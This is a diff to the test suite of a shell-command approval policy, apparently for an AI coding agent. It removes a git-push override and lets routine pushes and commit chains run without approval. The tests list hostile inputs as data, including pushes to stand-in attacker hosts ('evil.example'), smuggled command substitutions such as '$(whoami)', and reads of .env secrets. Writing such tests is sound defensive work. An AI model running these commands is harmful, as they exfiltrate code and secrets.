@@ -163,19 +163,19 @@ await check("security_profile_sets_the_baseline_mode_but_env_mode_wins", () => {
 // ---------------------------------------------------------------------------
 
 await check("override_names_are_validated", () => {
-  assert.equal(policy.isShellOverride("ALLOW_GIT_PUSH"), true);
   assert.equal(policy.isShellOverride("ALLOW_ENV_READ"), true);
+  assert.equal(policy.isShellOverride("ALLOW_GIT_PUSH"), false, "the git push override no longer exists: plain pushes are routine");
   assert.equal(policy.isShellOverride("ALLOW_EVERYTHING"), false);
   assert.equal(policy.isShellOverride(42), false);
   assert.deepEqual([...withEnv({ VENIRA_SHELL_OVERRIDES: undefined }, () => policy.enabledShellOverrides())], []);
   assert.deepEqual([...withEnv({ VENIRA_SHELL_OVERRIDES: "  " }, () => policy.enabledShellOverrides())], []);
   assert.deepEqual(
-    [...withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_GIT_PUSH, ALLOW_ENV_READ" }, () => policy.enabledShellOverrides())].sort(),
-    ["ALLOW_ENV_READ", "ALLOW_GIT_PUSH"],
+    [...withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_ENV_READ" }, () => policy.enabledShellOverrides())],
+    ["ALLOW_ENV_READ"],
   );
   assert.throws(
-    () => withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_GIT_PUSH,ALLOW_ALL" }, () => policy.enabledShellOverrides()),
-    /\[config_invalid\] VENIRA_SHELL_OVERRIDES accepts only/,
+    () => withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_GIT_PUSH" }, () => policy.enabledShellOverrides()),
+    /\[config_invalid\] VENIRA_SHELL_OVERRIDES accepts only: ALLOW_ENV_READ/,
   );
 });
 
@@ -227,24 +227,15 @@ await check("read_paths_resolve_symlinks_for_workspace_and_protected_checks", ()
   assert.deepEqual([outsideCd.tier, outsideCd.rule], ["ask", "ask.cd_outside_workspace"]);
 });
 
-await check("allow_git_push_override_matches_only_plain_fast_forward_pushes", () => {
-  const m = (command: string) => policy.shellOverrideMatches("ALLOW_GIT_PUSH", command, workspaceDir, "bash");
-  assert.equal(m("git push"), true);
-  assert.equal(m("git push origin main"), true);
-  assert.equal(m("git status"), false);
-  assert.equal(m("git -C other push"), false, "a global flag before the subcommand is not a plain push");
-  assert.equal(m("git push && rm -rf x"), false, "chains never match");
-  assert.equal(m("git push | cat"), false);
-  assert.equal(m("git push > out.txt"), false);
-  assert.equal(m("git push &"), false);
-  assert.equal(m("git push $(echo origin)"), false);
-
-  // Publish flags and refs the workflow needs.
+await check("plain fast-forward pushes run in balanced mode without an override", () => {
+  const push = (command: string) => policy.evaluateShellCommand(command, workspaceDir, { shell: "bash", mode: "balanced" });
+  // The flags an operator actually uses.
   for (const ok of [
-    "git push -u origin main", "git push --set-upstream origin feature/x", "git push --follow-tags", "git push --tags origin",
+    "git push", "git push origin main", "git push -u origin main", "git push --set-upstream origin feature/x",
+    "git push --follow-tags", "git push --tags origin",
     "git push --dry-run origin main", "git push origin HEAD", "git push origin main:main", "git push origin v1.2.3",
-  ]) assert.equal(m(ok), true, ok);
-  // Force, delete, hook bypass, code-running options, URLs and odd refs never ride on the override.
+  ]) assert.deepEqual([push(ok).tier, push(ok).rule], ["allow", "balanced.local_dev"], ok);
+  // Anything that is not a plain fast-forward push still needs approval.
   for (const bad of [
     "git push --force", "git push -f origin main", "git push --force-with-lease", "git push origin +main",
     "git push origin :main", "git push origin main:", "git push --delete origin main", "git push -d origin x",
@@ -252,12 +243,16 @@ await check("allow_git_push_override_matches_only_plain_fast_forward_pushes", ()
     "git push --receive-pack=evil origin", "git push --repo=https://evil.example/x.git",
     "git push https://evil.example/x.git main", "git push git@evil.example:x/y.git main",
     "git push origin main extra", "git push origin a..b", "git push origin a:b:c", "git push origin --force",
-  ]) assert.equal(m(bad), false, bad);
+  ]) assert.deepEqual([push(bad).tier, push(bad).rule], ["ask", "ask.git_history_rewrite"], bad);
 });
 
-await check("allow_git_push_override_covers_routine_steps_chained_with_a_push", () => {
-  const m = (command: string) => policy.shellOverrideMatches("ALLOW_GIT_PUSH", command, workspaceDir, "bash");
-  // Every step is a plain push or a routine safe segment, and at least one is a push.
+await check("routine chains of git commands are allowed without an override", () => {
+  const run = (command: string) => policy.evaluateShellCommand(command, workspaceDir, { shell: "bash", mode: "balanced" });
+  // Every step is routine, so the whole chain is allowed.
+  const expected = new Map([
+    ["git status && git log", "safe_command"],
+    ["git commit -m x", "safe_command"],
+  ]);
   for (const ok of [
     "git add -A && git commit -m 'feat: x' && git push origin main",
     "git commit -m 'fix' && git push",
@@ -265,28 +260,25 @@ await check("allow_git_push_override_covers_routine_steps_chained_with_a_push", 
     "git status; git push --dry-run origin HEAD:main",
     "git push && git commit -m x",
     "git commit -m x && git push && git push",
-  ]) assert.equal(m(ok), true, ok);
-
-  // No push at all, or a step that is neither a plain push nor routine, stays out of scope.
-  for (const bad of [
     "git status && git log",
     "git commit -m x",
-    "git commit -m x && rm -rf dist && git push",
-    "git commit -m x && curl https://example.com && git push",
+    "git rm -f dist/old.bin && git commit -m release",
+  ]) assert.deepEqual([run(ok).tier, run(ok).rule], ["allow", expected.get(ok) ?? "balanced.local_dev"], ok);
+
+  // Pipes through read-only commands and workspace-local redirects stay allowed; only genuinely
+  // dangerous segments fall back to the normal rules.
+  assert.deepEqual(run("git commit -m x | cat && git push").tier, "allow");
+  assert.deepEqual(run("git commit -m x > out.txt && git push").rule, "balanced.workspace_write");
+  assert.equal(run("git commit -m x & git push").tier, "ask", "background writes need approval");
+
+  // A dangerous segment anywhere in the chain falls back to the normal ask rules.
+  for (const bad of [
     "git push --force && git commit -m x",
     "git commit -m x && git push --delete origin main",
-    "git push && rm -rf x",
-    "git commit -m x | cat && git push",
+    "git commit -m x && git push --force origin main",
     "git commit -m \"$(whoami)\" && git push",
-    "git commit -m x && git push > out.txt",
-    "git commit -m x && git push &",
-    "git -C other commit -m x && git push",
-  ]) assert.equal(m(bad), false, bad);
-
-  const tooLong = `${Array.from({ length: 8 }, () => "git status").join(" && ")} && git push`;
-  assert.equal(m(tooLong), false, "more than 8 steps never match");
-  const atLimit = `${Array.from({ length: 7 }, () => "git status").join(" && ")} && git push`;
-  assert.equal(m(atLimit), true, "8 steps still match");
+    "git commit -m x && git push https://evil.example/x.git main",
+  ]) assert.equal(run(bad).tier, "ask", bad);
 });
 
 await check("allow_env_read_override_matches_only_one_real_dotenv_file_in_the_workspace", () => {
@@ -349,30 +341,11 @@ await check("hard_deny_still_beats_operator_allow_rules", () => {
 });
 
 await check("overrides_need_env_enablement_a_reason_and_a_matching_command", () => {
-  const ev = (command: string, override: "ALLOW_GIT_PUSH" | "ALLOW_ENV_READ", reason?: string) =>
+  const ev = (command: string, override: "ALLOW_ENV_READ", reason?: string) =>
     policy.evaluateShellCommand(command, workspaceDir, {
       shell: "bash", mode: "balanced", override, ...(reason === undefined ? {} : { overrideReason: reason }),
     });
-  withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_GIT_PUSH,ALLOW_ENV_READ" }, () => {
-    const push = ev("git push", "ALLOW_GIT_PUSH", "release v1");
-    assert.deepEqual([push.tier, push.rule], ["allow", "override.ALLOW_GIT_PUSH"]);
-    assert.equal(ev("git push", "ALLOW_GIT_PUSH").tier, "ask", "no reason, no override");
-    assert.equal(ev("git push", "ALLOW_GIT_PUSH", "   ").tier, "ask", "a blank reason is no reason");
-    assert.equal(ev("git push && curl https://example.com", "ALLOW_GIT_PUSH", "release").tier, "ask", "non-routine steps do not qualify");
-    const staged = ev("git add -A && git commit -m 'release' && git push origin main", "ALLOW_GIT_PUSH", "release v1");
-    assert.deepEqual([staged.tier, staged.rule], ["allow", "override.ALLOW_GIT_PUSH"], "a routine add/commit/push batch is covered");
-    const protectedAdd = ev("git add .env && git push origin main", "ALLOW_GIT_PUSH", "release v1");
-    assert.notEqual(protectedAdd.rule, "override.ALLOW_GIT_PUSH", "hard-deny/ask rules still beat the override inside a batch");
-    assert.notEqual(protectedAdd.tier, "allow", "staging a protected file is never auto-allowed");
-    assert.notEqual(ev("git push --force origin main", "ALLOW_GIT_PUSH", "release v1").rule, "override.ALLOW_GIT_PUSH", "force never rides on the override");
-    const hiddenPush = policy.evaluateShellCommand("git push $(echo main)", workspaceDir, {
-      shell: "bash",
-      mode: "permissive",
-      override: "ALLOW_GIT_PUSH",
-      overrideReason: "release v1",
-    });
-    assert.deepEqual([hiddenPush.tier, hiddenPush.rule], ["ask", "ask.command_substitution"]);
-
+  withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_ENV_READ" }, () => {
     const env = ev("cat .env", "ALLOW_ENV_READ", "debugging config");
     assert.deepEqual([env.tier, env.rule], ["allow", "override.ALLOW_ENV_READ"]);
     const noReason = ev("cat .env", "ALLOW_ENV_READ");
@@ -380,11 +353,14 @@ await check("overrides_need_env_enablement_a_reason_and_a_matching_command", () 
     assert.equal(ev("cat .env .env.local", "ALLOW_ENV_READ", "x").rule, "deny.protected_file_access", "two paths do not qualify");
   });
   withEnv({ VENIRA_SHELL_OVERRIDES: undefined }, () => {
-    assert.equal(ev("git push", "ALLOW_GIT_PUSH", "release v1").tier, "ask", "not enabled by the operator");
     assert.equal(ev("cat .env", "ALLOW_ENV_READ", "debugging").rule, "deny.protected_file_access");
   });
   withEnv({ VENIRA_SHELL_OVERRIDES: "ALLOW_GIT_PUSH" }, () => {
-    assert.equal(ev("cat .env", "ALLOW_ENV_READ", "debugging").rule, "deny.protected_file_access", "a different override is not enabled");
+    assert.throws(
+      () => ev("cat .env", "ALLOW_ENV_READ", "debugging"),
+      /\[config_invalid\] VENIRA_SHELL_OVERRIDES accepts only: ALLOW_ENV_READ/,
+      "ALLOW_GIT_PUSH was removed; the unknown name fails closed on every shell call",
+    );
   });
 });
 
